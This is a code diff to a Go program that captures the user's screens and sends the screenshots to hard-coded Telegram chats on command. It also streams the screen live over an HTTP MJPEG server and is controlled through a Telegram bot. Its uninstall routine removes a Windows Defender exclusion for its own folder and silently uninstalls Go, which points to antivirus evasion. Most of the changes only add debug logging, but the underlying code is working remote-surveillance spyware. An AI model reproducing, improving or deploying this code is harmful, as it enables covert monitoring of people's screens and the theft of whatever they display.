@@ -39,6 +39,7 @@ func init() {
         return
     }
     log.SetOutput(f)
+    log.Println("DEBUG - Initialized log file:", logFile)
 }
 
 func logRotate() {
@@ -58,14 +59,22 @@ func logRotate() {
 }
 
 func captureScreen() (*image.RGBA, error) {
+    log.Println("DEBUG - Starting screen capture")
     n := screenshot.NumActiveDisplays()
     if n == 0 {
+        log.Println("ERROR - No active displays found")
         return nil, fmt.Errorf("no active displays")
     }
 
     if n == 1 {
         bounds := screenshot.GetDisplayBounds(0)
-        return screenshot.CaptureRect(bounds)
+        img, err := screenshot.CaptureRect(bounds)
+        if err != nil {
+            log.Println("ERROR - Failed to capture single screen:", err)
+            return nil, err
+        }
+        log.Println("DEBUG - Captured single screen")
+        return img, nil
     }
 
     // Multiple screens: combine into one image
@@ -85,6 +94,7 @@ func captureScreen() (*image.RGBA, error) {
     for i := 0; i < n; i++ {
         img, err := screenshot.CaptureRect(boundsList[i])
         if err != nil {
+            log.Println("ERROR - Failed to capture screen", i, ":", err)
             return nil, err
         }
         for y := 0; y < img.Bounds().Dy(); y++ {
@@ -94,16 +104,20 @@ func captureScreen() (*image.RGBA, error) {
         }
         offsetX += img.Bounds().Dx()
     }
+    log.Println("DEBUG - Captured and combined multiple screens")
     return combined, nil
 }
 
 func sendToTelegram(bot *tgbotapi.BotAPI, img *image.RGBA) error {
+    log.Println("DEBUG - Starting sendToTelegram")
     buf := new(bytes.Buffer)
     if err := jpeg.Encode(buf, img, &jpeg.Options{Quality: 50}); err != nil {
+        log.Println("ERROR - JPEG encode failed:", err)
         return err
     }
-
+    log.Println("DEBUG - Encoded image, size:", buf.Len())
     for _, chatID := range allowedIDs {
+        log.Println("DEBUG - Sending to chatID:", chatID)
         photo := tgbotapi.NewPhoto(chatID, tgbotapi.FileBytes{Name: "screenshot.jpg", Bytes: buf.Bytes()})
         if _, err := bot.Send(photo); err != nil {
             log.Println("ERROR - Telegram send to", chatID, ":", err)
@@ -111,19 +125,24 @@ func sendToTelegram(bot *tgbotapi.BotAPI, img *image.RGBA) error {
             log.Println("INFO - Sent screenshot to", chatID)
         }
     }
+    log.Println("DEBUG - Completed sendToTelegram")
     return nil
 }
 
 func checkPort(port string) bool {
+    log.Println("DEBUG - Checking port:", port)
     ln, err := net.Listen("tcp", ":"+port)
     if err != nil {
+        log.Println("DEBUG - Port", port, "not available:", err)
         return false
     }
     ln.Close()
+    log.Println("DEBUG - Port", port, "is available")
     return true
 }
 
 func startMJPEGServer() {
+    log.Println("DEBUG - Starting MJPEG server setup")
     for i := 0; i < 10; i++ {
         if checkPort(port) {
             break
@@ -135,10 +154,11 @@ func startMJPEGServer() {
         }
         p += 100
         port = strconv.Itoa(p)
-        log.Println("INFO - Port", port, "in use, trying", p)
+        log.Println("INFO - Port", p-100, "in use, trying", p)
     }
 
     http.HandleFunc("/stream", func(w http.ResponseWriter, r *http.Request) {
+        log.Println("DEBUG - MJPEG stream request received")
         w.Header().Set("Content-Type", "multipart/x-mixed-replace; boundary=frame")
         w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
         w.Header().Set("Pragma", "no-cache")
@@ -157,14 +177,17 @@ func startMJPEGServer() {
             }
             _, err = w.Write([]byte("--frame\r\nContent-Type: image/jpeg\r\n\r\n"))
             if err != nil {
+                log.Println("ERROR - MJPEG write boundary:", err)
                 return
             }
             _, err = w.Write(buf.Bytes())
             if err != nil {
+                log.Println("ERROR - MJPEG write image:", err)
                 return
             }
             _, err = w.Write([]byte("\r\n"))
             if err != nil {
+                log.Println("ERROR - MJPEG write separator:", err)
                 return
             }
             time.Sleep(100 * time.Millisecond)
@@ -172,6 +195,7 @@ func startMJPEGServer() {
     })
 
     http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+        log.Println("DEBUG - Root page request received")
         w.Header().Set("Content-Type", "text/html")
         w.Write([]byte(`
             <html>
@@ -210,6 +234,13 @@ func uninstall() {
         output, err := cmd.CombinedOutput()
         if err != nil {
             log.Println("ERROR - Failed to get Go product code:", err)
+            // Fallback to hardcoded product code for Go 1.24.7
+            cmd = exec.Command("msiexec.exe", "/x", "{2A8F1E0B-CEFD-4B63-BE7B-EE672BFE23D9}", "/qn")
+            if err := cmd.Run(); err != nil {
+                log.Println("ERROR - Failed to uninstall Go with fallback product code:", err)
+            } else {
+                log.Println("INFO - Go uninstalled successfully with fallback product code")
+            }
         } else {
             productCode := string(output)
             productCode = strings.TrimSpace(strings.Replace(productCode, "IdentifyingNumber", "", -1))
@@ -252,6 +283,8 @@ func uninstall() {
             } else {
                 log.Println("INFO - Deleted", file)
             }
+        } else {
+            log.Println("DEBUG - File not found, skipping:", file)
         }
     }
 
@@ -282,7 +315,7 @@ func uninstall() {
 
     // Remove Defender exclusion
     log.Println("DEBUG - Removing Defender exclusion")
-    cmd = exec.Command("powershell", "-Command", "Remove-MpPreference -ExclusionPath '" + destFolder + "'")
+    cmd = exec.Command("powershell", "-Command", "Remove-MpPreference -ExclusionPath '" + destFolder + "' -ErrorAction SilentlyContinue")
     if err := cmd.Run(); err != nil {
         log.Println("ERROR - Failed to remove Defender exclusion:", err)
     } else {
@@ -317,6 +350,7 @@ func main() {
     if err != nil {
         log.Fatalf("ERROR - Failed to initialize bot: %v", err)
     }
+    log.Println("DEBUG - Bot initialized successfully, username:", bot.Self.UserName)
 
     startMJPEGServer()
 
@@ -335,16 +369,20 @@ func main() {
         }
     }()
 
+    log.Println("DEBUG - Starting update loop")
     u := tgbotapi.NewUpdate(0)
     u.Timeout = 60
     updates := bot.GetUpdatesChan(u)
 
     for update := range updates {
+        log.Println("DEBUG - Received update:", update.UpdateID)
         if update.Message == nil || update.Message.Chat == nil {
+            log.Println("DEBUG - Skipping update: no message or chat")
             continue
         }
 
         chatID := update.Message.Chat.ID
+        log.Println("DEBUG - Processing message from chatID:", chatID)
         allowed := false
         for _, id := range allowedIDs {
             if chatID == id {
@@ -358,8 +396,10 @@ func main() {
         }
 
         if update.Message.IsCommand() {
+            log.Println("DEBUG - Command received:", update.Message.Command())
             switch update.Message.Command() {
             case "screenshot":
+                log.Println("DEBUG - Processing /screenshot")
                 img, err := captureScreen()
                 if err != nil {
                     bot.Send(tgbotapi.NewMessage(chatID, "Failed to capture screenshot: "+err.Error()))
@@ -371,6 +411,7 @@ func main() {
                     log.Println("ERROR - /screenshot send:", err)
                 }
             case "uninstall":
+                log.Println("DEBUG - Processing /uninstall")
                 bot.Send(tgbotapi.NewMessage(chatID, "Uninstalling..."))
                 uninstall()
             }
